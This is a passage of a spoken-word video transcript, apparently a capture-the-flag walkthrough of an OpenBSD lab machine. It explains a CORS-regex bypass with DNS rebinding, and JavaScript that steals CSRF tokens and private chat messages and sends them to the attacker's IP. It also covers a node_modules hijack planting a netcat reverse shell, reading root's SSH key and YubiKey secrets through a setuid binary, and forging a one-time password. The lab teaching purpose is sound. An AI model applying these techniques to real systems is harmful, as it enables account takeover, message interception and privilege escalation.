defaults to true and essentially when it's true it doesn't wait until this finishes when it's false it's going to be blocking and wait for this script to finish or this line to finish before it moves on uh since we're doing stuff with headers because of the cross-site scripting we need with credentials as equal to true and then we can send it it didn't indent because i forgot the semicolon there so rec1.send and then we can say var object is equal to json.purse rec1.response and let's see javascript print line i think it's console.println let's see print console.log we can do so we can just do console.log object and let's test this out real quick um we don't actually need to do the phishing stuff to debug it we can start with python so python3 http dot server we probably want to listen on port 80. and then i can just go local host and we want to specify password reset dot php and it's going to download the file and it's doing this because of the http headers so we could either change this by making a python script and saying this isn't octet stream this is just text which wouldn't be too hard to do or we can just switch to a different web server so i'm just going to try the php one so sudo php dash capital s and the thing i have to be careful about this web server is to make sure any php file i have doesn't have vulnerable code because if i have like a php then system request thing in here and someone executes that script they have code execution on my system because php is going to execute this stuff but this little uh shell doesn't have anything dangerous in it so i can use the php server to do it without too much worry so zeros and then 80. so now let's refresh this page we can go to the proxy drop that one we can intercept the response to this and it is text html so when i oh localhost passwordreset.php it's probably still going to be what we think it is so let's intercept the request and it is yep text html so a browser is not asking us to download the file which is good so we can for this request and then we can see my browser immediately is making a request to this api auth and that should be good let's just go into our console to see what happens refresh turn intercept off uh does it get to localhost so we have to bypass something with cores right now it says the same origin policy dis allows reading the remote resource at this so there's some type of protections in here that's telling a browser hey don't allow them to access this there is some like niche bypasses to cores and that revolves around the period so if we open up a new pane we can kind of show this so we do just a standard curl dash s for silent q for quiet dash v reverse we want to see headers we set our header and this is what your browser's already going to do so we're going to say origin is equal to http 101014.8 and then we're going to make that request to crossfit club.htb slash api auth and we can look at the headers and we don't have any header that says access control allow origin and that's what we're really looking for so if the origin started from let's do crossfit dash club dot hdb we see this header and this is what we want so we can just grip for this um maybe we say two and one there we go so if we get this back we know this is on the allowed list so we can try like um the origin setting it to crossfit.hdb does not work how about like gym.crossfit.hdb we have an allow and the trick here is in the actual chorus policy if they don't put backslashes around these periods it treats them as wild cards so if we do like gem x dot crossfit.htb it's still loud if we did like xy it's not because a period doesn't match two characters so this is where the course bypass comes in is we can register this domain using unbound gym x crossfit.hdb and then because we have this we pretty much bypass course so what i'm going to do is copy this and for testing purposes i'm going to add this to my host file so now i can just um let's see instead of localhost we can specify this host and when i go here i'm not getting any course errors and it gives me the token we can also if we wanted to like debug the script we can go into the debugger go here we can set a break on this and then when we go to the console we can say object and we have this we could do object.token and we know that only outputs are token so this is kind of how we can debug the javascript we're writing so let's go back into our actual code so v um what is it oh we gotta go in www.thepasswordreset.php and we can do the second and third request now and i just realized doing it in this pane is a bad idea so let's get rid of this go back to this window and we're doing this pane because it has our notes on the left so let's go back to vi we can delete this and we'll say the second request rec2 is equal to we'll just copy this actually i don't know if that was quick or now or not but it prevents a typo which is always good so we got that we can say rectu.open this is a post request to http crossfit club dot htb api sign up and again we want to make this a non-blocking request so we say false and then we have to set the headers so rec2 dot set request header and we say content type and we gotta tell it it's json so application slash json like that and then the other header we have to set is going to be the c surf one so x csrf token and we can just put this one equal to obj.token so that should set the headers correctly in this since we're doing header stuff let's do rec 2 with credentials is equal to true and then we have to um create the data payload we want to send so const data is equal to json.stringify and we do username ipsec and then do we still have it in repeater somewhere i may have been able to just copy this yeah i can just copy this like that i think that's good and the reason why we do that is because if we just do this maybe const data is equal i don't know it's going to treat it as an object but we want this to be passed as a string so that's what the json.stringify is doing i think that is good and i guess we can say rec 2 dot send and then we tell it to send the data semicolon and then we do fur request 3 is equal to new xml http request i probably should have just pulled it from the top but oh well rec3 dot open get http 10 10 14 8 and we say b2a to convert to base64 rec2 dot response close all that rec3 dot send and let's see where i screwed up because there's no way i did this correctly the first time or maybe there is let's see uh we have to set the unbound and all that stuff it's probably in one of these panes right here so this is only dns let's go back to this pane where's the unbound this is what we want okay i'm going to do that in this window so now i can just do up enter and up up enter so sudo unbound control set here and we want to say jim was it jim x crossfit.htb jimx crossfit.hdb101014 like that connection failed see ping 10 10 10 232 works it may just take a second for unbound to clear itself or something there we go i don't know what it is but occasionally unbound gave some weird errors so we have that running where is the php server here it is so first one rule oh we have to go in burp and send it so instead of saying ipsec employees we can say jim crossfit hdb uh access denied maybe my c surf token or something's bad let's go back here now this is getting messy let's clear up a few panes and i'm gonna do it from scratch so we have that first one rule this netcat session we don't need so i can clear that let's go in dub dub dub php dash s000 80 pseudo let's stop the web server on this one okay php web server is running unbound has been reset let's go to firefox prep suite make sure we're not intercepting something already and david palmer and here is going to be jim x crossfit.ht send forbidden employees xcrossfit.htb forbidden so it works with employees and we worked with ipsec dash employees but it doesn't work with like employees x huh so there's something else we have to do so if the regex is just really bad we can put a slash here and try employees.crossfit.hdb because the host header is terminated by slashes as well it's just one of those unknown unique things so we can try this and see what happens so gem x crossfit.hdb send and it looks like it works and if we go back here we have unmatched request so what we have to do here is now edit our fake.com and put the new dns which is gemx.crossfit.htb we rebind send this and we'll see if the user comes to us if they make a request to this it should work the first two did so now we're just waiting to see the user hit our web server and this can take a few minutes so we'll just wait and hope everything goes well it looks like i screwed up somewhere because he got our page but he never sent us a request saying like what the result of the account creation was both of them are just the token which is him clicking the password reset link i'm guessing he did it twice back to back because i may have sent the request twice so let's go take a look at the password script looking at this we are getting on this this seems to well we don't know if this works actually but we tested this with our local browser so i assume this works uh crossfit club this is why i always use yank and put so i should be using them i think that was just a simple typo so run this again uh wait we probably need to unbound control then run it there we go match the request twice so we probably wait um another minute or two or immediately wow so it looks like we have a hit already does it get and then we have this base64 if i did this in python and did the python web server i could have it automatically decode that base64 which would be nice but not too big of a deal uh passwords do not match so we screwed up somewhere so let's see username ipsec password again with these typos let's just do p l e a s e s u b s and this is why it's super handy to do that third step even though technically it's not needed but for the sake of like error handling and things like that oh man that saves time so do this and again wait a couple minutes maybe it will be instant like it was last time but highly doubt that so gonna wait and see what happens so it's been a few minutes and we have another hit so let's check this out it's not ending in well yeah i thought the last one ended in equal so we think this is different yep there's two equals on the end of the last one so at least it's a different message and it's user has registered successfully so after we fixed up the two typos this script worked and the password is please subscribe so we can now go to this crossfit club.htb login and login with ipsec please i thought we could yeah that's set sign in what copy p-l-e-a-s-e subscribe something weird is going on i may try a lowercase payload the main reason being let's see do i still have it no it's sending me uppercase i'm [Music] not sure with what went on here ipsec p-l-e-a-s-e scribe okay i just had to refresh the page um i do not understand that one bit but looks like it works i wonder if that means like the password was somewhere cached in javascript or something um interesting let's just move on uh and we can go to this chat thing and looking around this it looks like it's another like internal chat like the last one that was javascript and not sure what's supposed to go on here let's say hello and message each person to see if anything happens we have someone message don't know what that is is just random text so doing hello on everyone is there anyone that responds we could try also putting links in and doing attacks against them but nothing seems too interesting i'm just going to let this sit for a little bit and we'll see if we get anything i guess we could be intercepting these requests to see what endpoint this uses so if i get a proxy we can look at history and is anything happening what if i do proxy intercept on do you know how google maps calculates traffic i wonder if we do websocket history that's probably it so let's turn intercept off websocket history turn it to newest is first and this is still the old websockets i'm gonna say no and again just trying to figure out how this application works so we're sending a post to socket.io and this global message sender id content and the room id so this room id is probably going to be like individual people so if i for this we're just getting websockets so i'm going to try a websocket to an individual person i guess did i close it or did it redirect me don't know what happened it's intercept on send this we can see room id 15 so this is probably his user id or something private message content hello again nothing too interesting here the thing i want to do is intercept a message so i'm going to go turn intercept on again and go to the options and it says does not match i'm going to remove javascript a lot of times when you test like node.js express whatever your burp window you want to remove that extension from the bypass list so now you can see we're just intercepting all these requests so it looks like purp is working now um i guess if it errors out or you take too long it auto logs you out and redirects you that would be my guess at what just happened there so let's see i'm gonna wait to see if a user responds to me let's do hello i should be able to see that message here somewhere there we go that's probably this one so global message see just did it get i don't have anything i'm going to clear the history because i just noticed something somewhat interesting so let's refresh this hello man that is a lot of requests so it's got the socket io here and when i join the room it's going to send this user join message so this is probably like the authentication whenever i join it says this which notifies everyone hey i'm here then we send message and hardly enough that person said do you like rap music and i did not get it but it may be in a response tab maybe this one nope that's just okay so i'm not exactly sure how to [Music] correctly intercept this see if anyone else says anything but this seems like we could do more cross-site scripting if we use a cross-site scripting to create a websocket and then tell people we join we can probably just eavesdrop on the people chatting so let's take admin because we know this is probably going to be david porter or not david porter david palmer and if we create the javascript around that we should be able to see his messages so let's do v password reset dot php html and then script we have to load the websocket or socket io so source equals http crossfit club dot hdb socket dot io and then let's see is it just socket io.js socket io slash transport unknown socket.io.js there we go so this is the library it uses and if you did not have this if you just go to github socket.io this is a public thing so we could probably use this as well and host it on our server but might as well not host on our server if they already host it so socket dot io.js slash script and then script so var socket is equal to io.connect http crossfit club.hdb and we don't need the slash ws here because i think it already does that or hold on yeah i think it should already do that we can do socket.emit user join and then i'm going to specify ipsec so we can test this out uh is it capital or lowercase when i'm doing it capital okay then socket on and we have to figure out where the socket i o interceptor gets messages i'm just going to run wireshark pseudo wireshark let's do ton zero and then refresh this hopefully someone says something in the chat soon so gonna pause the video until we get a message we have a few messages now so what i'm going to do is go back to wireshark i'm just going to do control f and then we're going to search for a word probably quin and let's see find string send packet bytes click find and then all we do is follow the stream and here's the function that was called receive global now if we want to hook private messages we have to figure out what this private function is and probably the easiest way is to um register another account on this server so i'm going to kill wireshark and then let's just write this to tmp because um we're not ready yet and we can move password reset php back and let's create the second account ipsec 2. there we go and set up the php web server again and then set this up so hopefully we get a hit soon so send this match2 so what the goal here is to figure out exactly how we can hook the receive function for private messages and then create a cross-site scripting payload to take all the private messages and send them to us so if we cat temp we've started it we tell everyone we joined but we don't have the um event where we can do if we get a message so that's what we're waiting on doing and hopefully by creating a second account we'll be able to identify what that second message looks like or a private message so i have a incognito open let's do ipsec 2 please subscribe oh well i just got to wait for him to hit my web server and then we can refresh the page so i'm gonna pause the video until this happens so it looks like the second user got created and it doesn't end in two equals and i think that meant that this was the user create thing so let's just try logging in i click sign in and that time it worked without refreshing so it's probably just a myriad of typos earlier i can't explain it any other way so i'm logged in on one and we can see ipsec 2 is here so i'm going to [Music] open up wireshark again let's see sudo wireshark go to ton0 and we're going to send a message please subscribe so i sent that message to someone i don't know if i sent it from ipsec one to two or vice versa but it doesn't matter i'm just gonna search for the word please and then we follow the stream and let's see that's not that one probably the next stream is please in here if not we're going to search and find the second one so the issue here is i'm getting both i have um the send and the receive because i'm doing it on the same box so let's see tcp stream that's not it let's just go back here asd qwe send it's probably going to be the second one because the first one is obviously gonna be sending so we want the second match find so this is send we can see right here see and this is the receive so follow tcp stream private underscore receive is what we want to hook so i'm going to go back to my tap script and we can move password reset to the backup reset dot php and socket on we can say private receive and on that event we want to pretty much call like a function to send a message so we can do uh var then request sequel to new xml http request and then rec.open we do a git then http 10 14 8 and b2 a json.stringify.message it's the parameter we specified and we actually don't need that true i think get because true is default so that should be good then rec.send and then we close this think that closed and then slash script slash html so we can test this out by seeing if we can hook ourselves so i'm joining as ipsec so i should be able to go to this window if i leave chat let's close out close out if i go here ipsec is no longer online that is good let's go to http localhost password reset i did not go online so i don't know if this worked i'm looking at console unexpected token uh line 9 67 so we have an extra parentheses there so let's clean that out socket on okay let's run this looks good go here ipsec did turn green and if i send a message test we get this base64 which is probably just going to be test so let's do echo dash n base 64-d undefined this is why we're testing it so what do we have uh well see nope i was gonna say we're not sending anything but we are this stringify is like this there we go refresh uh this is the wrong one refresh this guy test and if i go here refresh test i sent that in globalchat earlier i guess this is looking like it's longer let's see what this message says echo dash n base64-d sender content is test so we have a message we could probably specify all the way down to just only say test but this is good enough for me so let's edit this and the username is going to be admin because we assume that is david palmer going back here capital a looks good so we're still hosting this server we can resend the phishing request so do unbound set up fake dns go to responder and send this so that matched we can close out wireshark because we don't need this anymore see we can close this window maybe there we go come on stop exit quit without saving so now we just gotta wait for the user to hit our web server which can take a few minutes so gonna pause the video so it took a while but we finally have him hitting our password reset page and then we're sending some base64 so let's see what this message says we're just going to check messages one by one so echo dash n base64-d and we get a shout out to i guess bsd bandit they're all yipi but let's just um keep waiting until the next request comes in of someone messaging the admin it's been a while and i haven't seen any new messages so i'm going to test this out by messaging admin myself so if i do test i think we got it there was a second message so let's just see if this says test if it does we'll just keep on waiting to see if anything else comes through so base 64-d and indeed it just says test so let's just wait and see if we get any other messages we got another message looks to be a long one let's see what this one says and really probably should create a python app so it automatically decodes this base64 for me but yeah this one's just saying wow there's a town in alaska where the mayor of the town is a cat but again let's just see the next message so we have a few more messages i just let it sit a while if we go through these let's try this one echo dash n base64-d are you a fan of google or microsoft let's see a lot of people message this admin guy let's try this next one copy echo dash n base64-d and here's an interesting one hello david i've added a user account for you with the password this and our user is david and we have a potential password if we went into our inject let's do python3 inject.pi and we read etsy passwd we do have a david user so um let's try this again so grab this and let's ssh david at 10 10 10 2 32. try this password and we get in we don't have like key like up down whatever with the default shell i think bsd normally uses csh but if we just type sh we have our normal login shell that we're going to be used to so it's time to look for a privesque we could just run lin p's but this is openbsd i'm not exactly sure how it would work so i always like checking a few things the first is just the home directory to see what type of batch history or my sequel history of vim history we have the answer is none of them bash history does exist but it's pointless definitely actually not bash history just history so nothing we can really get there the other thing i like checking is like running processes so i'm going to do like ps aux and we don't get that much i thought i was going to see a lot more ps ef e actually i'm not sure how to see processes maybe this is configured where we can't see processes of other users you can do that on linux by the hide pid flag if you put that in cfs tab so i'm going to try it over here and i don't see hide pid or anything resembling that uh grep ri hide pid let's point that to dev null for errors so not sure exactly how this is working but i don't think i can see processes of other users it could be a different flag nps to do that but since top didn't work either i'm going to say that hide pid thing is implemented so the next thing i like doing is just looking at files owned by me so i'm going to start start by the um groups so sysadmin so find slash dash ls dash group says admins and oh find is a weird binary with these arguments um this isn't working because i guess it's doing ls first and then gonna do group don't understand the logic behind that but if i change it we have it now doing what i expected to show me all the files owned by the group's admin i can point that to dev null for errors and just let this run to find out if there's any files on the system that are owned by sysadmins um is that a default group let's do cat etsy group grep cis admin no it's like admins right yeah lsla for our log adm so there's one file that is owned or looks like a directory opt sysadmin so if i go into opposite admin we have server then we have statbot and statbot.js so there's no syntax highlighting so i don't know why it opened up in vim let's just cat statmap.js and we can see what's going on so we start off by loading websockets file system log the file create the websocket and if we can connect it says bot is down fail to connect failed to receive oh there's an else here so if we can't connect it's going to either say fail to connect or fail to receive and it's got a long message to temp chatbot.log so that's good to know and then it's just checking a message so let's go look at temp chatbot.log and we see august 12th modified time is 12 25. if i look at the date that is this minute so it's writing to this file and i don't see anything here where it's going to run constantly so it's getting executed each time and if i cap this file we can just see it's saying bot is live and then uh every 10 minutes the bot goes down so i'm guessing something restarts but the script looks like it gets ran every single minute now there is one other thing that's interesting is there's no node modules directory here it's just statbot.js here i'm guessing their modules is somewhere in var uh let's go cd slash var find dot dash name node underscore modules did i do that correctly to dev null say node module let's see let's do find dot grep node underscore maybe we'll find slash so it's under user local so user local lab node modules now if we go over to google and say node.js load module i think this is gonna get me to the man page go here not the video loading from node modules folder it has some really weird behavior so it's going to check the parent directory or check the directory if it's not there it moves to the parent directory and so on until the root of the file system is reached so that means we may be able to create a node modules directory somewhere in this opt sysadmin folder because in the statbot folder there is no node modules so what i'm going to do is go to slash opt i'm going to do find dot dash type d for directory and then dash ls and we can see all the permissions we see this one well these are all different well this one's different because the group but this is seven seven i forget what this is maybe seven seven five i think it does not have right anyone so members of the earners and group can write here but anyone can't we're not member of wheel or root so we can't write there this one only root can write in the directory but the sysadmin directory um members of root or if i can click and highlight sysadmins can right here so if i go into sysadmins whoops we should be able to make directories so temp yeah we can so what we do here is we create a node modules and see if it executes and sends it over to us so let's clear all this i can just do a reverse shell here let's do 9001 and then we'll makeder dash p because we need to create two directories and this will create the parent directory if it doesn't exist so sysadmin and then we're going to create node underscore modules and then we have to use one of the libraries it used it loaded ws fs and something log to file or something i'm just going to use the very first one which is ws for websocket and then we have to create a file so i'm going to go to the reverse shell cheat sheet i'm doing this because i can't use my trusted bash one liner because that just doesn't work on bsd this one um we can use anything else probably well not anything else but no which one do i want where is it this is the old faithful so let's echo dash n i want to make sure i can print this and this line wrapping is going to get annoying so i'm going to do it in a directory there we go so we do that rm then nc let's make sure we have nc we do so we can say 10 10 14.8 port 9001 and we also have to create this in a node.js one liner to execute code so i can say require i'm going to just do that then child underscore process exec sync then reverse our one-liner and then like this i think that's good let's cut this okay i'm just going to put everything i want so we can echo that to up sysadmin node underscore modules ws index.js is where it goes to load so if i cap this rev shell we have hopefully everything we need paste directory doesn't exist anymore so i guess there is a cleanup so let's just make that directory again run it and we'll wait probably a minute so i'm going to look at the date and we have 20 seconds to wait so i'm just going to pause the video and just like that we have a shell if i do the who am i we have john so we are not root um i was about to type pseudo-l but this is mbsd um it's do as on bsd let's see who is john i wonder if we can still do the python check for a tty python3 dash c import pty pty dot spawn ben bash no such follow directory which script i wonder if i can do is it script dash queue ben sh dash o devnull let's try script c ben sh devnl script started script done okay um i'm not going to worry about getting a tty i'm sure it's possible but not exactly sure how so the next thing we want to do is groups again and we can just repeat the process um we're still in sysadmins but we're also in the staff groove group so let's just see who what this group can do so find slash dash group staff and then dash ls error messages to devnull and it looks like so far we have a binary use a local bin log so i'm going to see if anything else pops up and if it doesn't then chances are that's what we're going to use i'm going to stand up and netcat so lvnp 9001 again two now let's make the x for binary exploitation and then nc lvnp 9001 and we can cap this pipe it over to netcat 1010 14 8 9001. hopefully i did that correctly i did but i'm not directing this to a file so we'll call this log and we'll re-paste this and give it a few seconds because it's not going to terminate itself but now we got this log binary we can't execute it on linux because all the syscall numbers are like incorrect i forget the last video we did it on but it was a nightmare doing that so let's just execute here to see what this does user local bin lsla log and this is set uid that special bit is set if we do stat on log we can probably see i don't know but it looks like a set uid so execute log and it wants a file to read so log see past wd and log file not found if we pass it a log file like ver log let's do security dot out dot slash log log security dot out wait huh it read a few things oh no this is the security.out file i just didn't know what it would be i'd assume we'd have like the standard linux timestamps but no it's definitely a weird file set uid deletions crontab yeah but interesting so we should look at this log thing so let's open a new pane so we can open up geeja and take a look my guitar is installed in art gedra so we can just run it and then we'll open a new project by cleaning that little dragon thing and then once this opens i hit i to open up a file to import go to the log and we will import it i'm just going to do all the default analyzation so come on yes analyze okay and then we can go to the exports and go to main and this is my issue with a lot of the bsd things it just how it does syscalls is really wonky so this looks like it's going to be a syscall this one function here and if we go into it it just does an infinite do while loop however if we look at it in the disassembly let's see it's moving this pointer to unveil to r11 if we go to a different syscall we can kind of see that let's try maybe this awesome you can see it does it for all of them which is annoying this one is f-seek so we could go through and re-label all of these but for a basic reversing challenge um i've tended to like the cutter interface just a little bit more so you can get that at carter.re i think yep and then just download we can take a look at what this looks like there are some things i don't know how to do in this so um i like find myself using both so let's do chmod x downloads cutter dot app image and then we can open it up select a file so i've shown this before whatever oh unbalanced and open keys or probably open keys the one i showed this on the other bsd box that's a pain but we open the file we can just do the default analyze and i have dark mode enabled if you want to enable that it's just edit preferences and then appearance and then interface name dark so if we go to main uh we're in disassembly now we can switch over to decompiler so go to main it looks a little bit different than geeja i can switch over the decompiler mode this way we can kind of see how it works um we can see this function and then it passes the arguments and it's got the same bugs because it uses the same actual engine as giger does i believe but if we go to this one and we take a look at it in the decompiler view just clicking here we can see this is putting puts in r11 uh let's go to this one oh yeah i'm on the usage so yeah that is calling that but this function right here above the ver this is the unveil so let's rename this so 1fb0 we could probably just go in it and then here hit n oh this is puts i don't know why i keep going into that but we just rename that uh this is print f so you could go through all these manually and this is something that it should have done for you but because it's bsd for some reason it behaves differently this is the one i wanted this is unveil so what was it gonna show oh the other thing that um is different between these two views is the syscalls here don't have any arguments if i switch that over to geidra's view we can see it's putting arguments here so 0x82c and 82a if we go there i don't know exactly i guess maybe we can we know that's pointed to slash var but it's not telling us that but if we switch to this decompiler it is so geeja's doing it better by knowing the function and accepts two arguments um carter is doing it better or raider is doing it better by how it displays things and then i also like the um kind of ida-like view of showing me the registers so if i do a search on unveil github and of course we gotta go to google to do that uh not github bsd we go to the syscall page and we can see it accepts two things path and permissions and if we go here we have two registers being set and the calling convention is the first argument's gonna be rdi then rsi then rdx and rcx if you have arguments three and four and r8 and r9 for five and six so we can kind of just piece that together ourselves i don't know exactly how to change like how it's defined to give multiple but we know it's calling unv unveil on that and then 82a is a permissions i'm not exactly sure how it does it but essentially from my reading of this and you can read it as well i think this is pretty much equivalent to like a ch root type of thing so it's setting me into this slash var directory and then i guess if something fails it says contact administrator but if we go back to a reverse shell we're in for a log i think yep so i can do dot slash log and we can try to read um like var dot dot slash etsy pass wd and we get log file not found so the unveil call is only exposing the slash var directory to us that's why this path traversal attack won't work to my knowledge uh bsd does have backups and stuff if we do etsy change list i think we can view it and this is going to view all the files that are periodically backed up and then when it's a plus i think that means it's changed or something but we can see there are ssh keys here so we got ssh id rsa and those go into var backups i believe yeah so cat verb backups and then any slash gets translated into an underscore so it would be root dot ssh id underscore rsa so that's kind of how it would look so if i uh do dot slash log on this file not found let's see did i do that wrong root i wonder if the underscore behaves differently oh wait i see what i did um i forgot the dot current because it takes multiple versions of backups remember we saw like that plus and things of things changing well you got version history so dot current we'll do the latest one so like that we have now just stolen the private key of ssh so we should be able to just log in v i d rsa uh wrong clipboard ch mod plus uh 600 rdrsa sh-i idrsa root at 10 10 10 2 32 and we get password we can add a dash v flag to see what's happening and it says authenticated with partial success if we don't have that um it's just going to fail we don't have that personal success and ask for cool i don't have root i think it i deleted the wrong thing that's what happens sometimes when you're talking but we don't have any um idrsa files just no more authentications try and cuts us out that's interesting actually if i did a user that doesn't exist password login is enabled if we try root we can't do a password but if we do a private key it now asks for a password so it's requiring two forms of authentication so let's take a look at the ssh config so ls etsy ssh is our sshd config there is so we can see match user root authentication method public key password and then if we cat etsy i think login.conf we can look at root what is a root wow this is a bigger file than i thought i know that's ssh config let's just do a bunch of line breaks cat etsy login.com see what this file looks like staff demon default so it's got ubq authentication here we go so settings used by etsy rc and root and it's requiring newbie key so let's go back up to see that auth ssh ub key so chances are this is going to be the password it is asking for um in order to get the yubikey stuff we have to read files out of var um let's see open bsd ub key var db let's see does it tell me where these files are stored ver db ub key so how i would go about doing this which doesn't translate to uh videos well is installing openbsd and yubikey on your own system and then exploring how it works uh vb root.key root.uid and root.ctr is probably what we want so let's just see if we can grab those so dot slash log and then var db ub key root dot uid so we got this let's just copy it so make the ub key v root.uid and paste that so the next one was i think root.ctr and this is counter so in terms of the counter we just need to increment it by one because this is like the um unique identifier for it so if we did the same counter the certificate it would go to would go to an old one so we'd probably want to do like nine zero to make sure this counter is unique um probably explain that horribly but that is more of like the serial of a certificate i guess and you can't have duplicates of that and i think key was the final one which is like a aes key i believe and yubikey terms so v root.key okay and then i'm going to go to google and let's try ubiqui simulator do we have one github is this going to work i don't know if this is going to work and index.php followed and do it i'm going to try this uh i haven't tried this before but it's 10 years old so who knows but these things don't change too often so maybe the index.php php dash s uh let's only listen on localhost uh let's do 8001 localhost 8001 token id encryption key usage counter lock code i know where a lock code is let's see counter let's oh god paste it in my terminal [Music] so counter encryption key and then oh i don't know what these are token id and internal id i'm guessing tokenid is root.uid i don't know what internal id would be let's go do i still have this i wonder if i'd have to generate this let's just put zero what happens no idea so let's try a different simulator so ub key simulator github ubsim what is this so it just wants us to run it with java let's try this one get clone ubsim [Music] java c ub simulator oh come on okay we got a yk file so it's got the public id i'm guessing this is the field that we didn't know so a s key let's just edit this yk file uh whoops there we go so uid i'm going to say this is secret id the counter let's do 985 090 and then secret aes key that is going to be this and what if we run this file again still errors out and i am not sure why we may just have to be going to something else let's see java xml bind does not exist so i may have to install a package let's see trying to do this removed is this going to tell me how to install it reproduce so i think it wants just a old version of java like java 8 java version 11 app search open jdk do we even have eight we do sudo apt install open jdk 8 jre it's already installed so how do i set my java version locate java probably want to do dash r for regex grep for eight let's see slash user local java no user java where are you installed java create8 and bin here we go maybe we can try this does java c exist let's see jerry bin java let's just try java and then where's the file called where is it uv simulator let's try setting the version so java linux set version i think let's see switching between java versions on ubuntu maybe it's the same update alternatives config java let's try this and then if this doesn't work i'm probably just going to switch and um use a different program so java c ub simulator and still has that error so switching it up we're going to use the ub yubikey provided binaries they are really under documented which makes it hard to use but thankfully oxdf had did that research for us and helped me a lot with this part so i'm going to search for ubico's github repo and then we just need the i think it's ubico dash c for the repository and we want to download this so get clone download and then one of the dependencies is going to be ascii doc so sudo apt install ascii dock and then we will do an auto reconfigure to install it and just manually compile it so i'm going to just pause the video until this install finishes so we're not waiting for it to download now that ascii docs installed we can do auto config install and then once this is done we can do dot slash configure and then uh make install so let's do dot slash configure and then make install probably needs to be pseudo so i can place it in the places it needs to go and we can try yk generate dash h and oh we don't have something that's not good um sudo make check passed everything sudo make install i wonder if i have to run ykgenerate as root uh let's open a new pane yk generate where is this file does it exist sudo update db and then once this finishes we can just do a locate for that file but that's weird i can also locate i'm not having any luck with this yubikey piece of the video let's see dot libs the file exists i wonder if i go into dot libs yk generate is it gonna pull it cannot find file or object that is bizarre let's try a different ubi key thing let's do uk yk purse and we still have that let's just now search the error message and let's see what if i can just get rid of that let's see what this says update ld library path should be use a local lib it's not i wonder uh what happened to my box but we can set this and then try it so export ld library path is equal to this okay well we got it working again i'm not sure what happened but we should be fine so let's go into yk generate dash h and we need to give it these parameters so it wants everything as hex i believe so the first thing is the aes key then it wants the internal name which is this one and then it wants the counter and it's 16 bit so it wants hex so if i go to cyber chef github let's see we can just convert this to hex easily could probably do it in python or something i've just gotten the habit to go to hex delimiter none is that right i think that just took one two three four it doesn't look right two hex there we go i think it was taking that as a ascii value so i'd probably have to do like two decimal or something and then two hex but google saves us so we want to increment this by one and then let's see it wants low and high i don't know exactly what these are it wants them in 8-bit form so i'm just going to try 0 0 1 yk counter must be 4 characters so maybe 0 8 o2 yk low must be 4 characters 5k high must be 2 yku's must be two and we got a key uh we can drive this works i don't know what the low and high are um it doesn't seem to change but anything h dash i i d r s a root at 10 10 10 2 32 and it wants the password we can try this and failure so we did something wrong let's try changing up the x to zero f o eight um the reason why i did that is just we chopped off the f earlier so i'm putting the f back on to leave it at 8 form and we can try logging in with this key so copy paste and it does not work see do we generate the key afterwards i don't think that would matter but guessing we have something wrong let's try the yk purse to persecute and this one requires the aes key and then the token so let's do cat ub key root dot key so we can parse this and then this and let's see the counter let's make sure a counter is correct three eight four eight and if i cat you be key root dot counter that may be wrong i wonder if root.ctr was the wrong one to use i'm honestly not sure how this works i do want to try one last thing real quick or hopefully one last thing let's try generating with this um i'm guessing somewhere along the lines my counter is wrong because it's the only thing that really makes sense at this point so let's go ssh again there we go so it looks like that session has to be two and then we can cat root our text so finally do more research at exactly what this is but let's see if it works twice failure so let's try incrementing that counter by 1 now so 0f09 and grabbing it and there we go so we'll always have to increment the counter when we do a successful auth but that's it hope you guys enjoyed the box take care and i will see you all next week